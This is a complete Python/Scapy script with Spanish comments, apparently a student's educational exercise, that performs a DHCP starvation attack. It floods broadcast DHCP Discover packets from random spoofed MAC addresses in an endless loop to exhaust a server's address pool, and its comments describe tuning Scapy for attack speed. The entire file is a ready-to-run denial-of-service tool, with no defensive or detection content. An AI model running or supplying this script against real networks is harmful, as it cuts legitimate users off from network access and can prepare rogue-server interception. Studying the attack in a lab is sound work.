#!/usr/bin/env python3
# Script: JordyRosario_20250737_DHCP_Starvation.py
# Propósito educativo: Agotar el pool de direcciones del servidor DHCP.

import sys
from scapy.all import *

def lanzar_dhcp_starvation(interfaz):
    print(f"[*] Iniciando ataque DHCP Starvation en la interfaz {interfaz}")
    print("[*] Generando peticiones con MACs aleatorias para agotar el pool...")
    print("[*] Presiona Ctrl+C para detener.")
    
    # Desactivamos la comprobación estricta de direcciones de Scapy
    # Esto optimiza drásticamente el uso de CPU en Kali y aumenta la velocidad del ataque 
    conf.checkIPaddr = False
    
    try:
        while True:
            # Generamos una dirección MAC completamente aleatoria en cada ciclo
            mac_falsa = RandMAC()
            
            # Construcción de la pila del paquete DHCP Discover
            capa_ethernet = Ether(src=mac_falsa, dst="ff:ff:ff:ff:ff:ff")
            capa_ip = IP(src="0.0.0.0", dst="255.255.255.255")
            capa_udp = UDP(sport=68, dport=67)
            
            # El campo chaddr (Client Hardware Address) del protocolo BOOTP
            # debe coincidir con la MAC falsa para que el servidor lo procese 
            capa_bootp = BOOTP(op=1, chaddr=mac_falsa)
            capa_dhcp = DHCP(options=[("message-type", "discover"), "end"])
            
            paquete_starvation = capa_ethernet / capa_ip / capa_udp / capa_bootp / capa_dhcp
            
            # Inyección silenciosa a nivel de enlace de datos
            sendp(paquete_starvation, iface=interfaz, verbose=False)
            
    except KeyboardInterrupt:
        print("\n[+] Ataque DHCP Starvation detenido por el usuario.")

if __name__ == "__main__":
    interfaz_red = "eth0"
    if len(sys.argv) > 1:
        interfaz_red = sys.argv[1]
        
    lanzar_dhcp_starvation(interfaz_red)